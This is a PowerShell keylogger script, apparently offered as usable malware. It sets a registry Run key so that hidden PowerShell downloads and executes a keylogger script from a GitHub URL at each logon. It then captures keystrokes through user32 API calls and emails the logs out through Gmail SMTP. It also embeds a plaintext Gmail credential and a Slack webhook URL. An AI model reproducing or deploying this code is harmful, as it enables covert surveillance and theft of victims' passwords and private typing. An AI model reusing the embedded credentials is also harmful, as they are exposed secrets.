# Rersistence (Reg)
New-itemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "bass" -Value "powershell.exe -w 1 -noni -nop IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pvgodd/CCIT-2/main/keyloger.ps1')" -PropertyType "String"
# SMTP.Gmail && Slack API
$TimesToRun = 2
$RunTimeP = 1
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pvgodd99@gmail.com', 'jvyiggrpgogdfrrh')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'pvgodd99@gmail.com'
$ReportEmail.To.Add('pvgodd99@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
#-----------------------------#
$Webhook = "https://hooks.slack.com/services/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"
$ContentType= 'application/json'

############################





function Start-KeyLogger($Path="$env:temp+"\log$(get-date -f MM-dd-HH-mm).txt"") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    $Runner = 0
	while ($TimesToRun  -gt $Runner) {
	$TimeStart = Get-Date
	$TimeEnd = $timeStart.addminutes($RunTimeP)
	while ($TimeEnd -gt $TimeNow) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
	  $TimeNow = Get-Date
    }
	$Runner++
	$ReportEmail.Attachments.Add($Path)
	$SMTPInfo.Send($ReportEmail)
    
	#Remove-Item -Path $Path -force
	$Runner = 0
	$ret=Start-KeyLogger
	}
  }
  finally
  {
    # open logger file in Notepad
	
	
  }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-KeyLogger
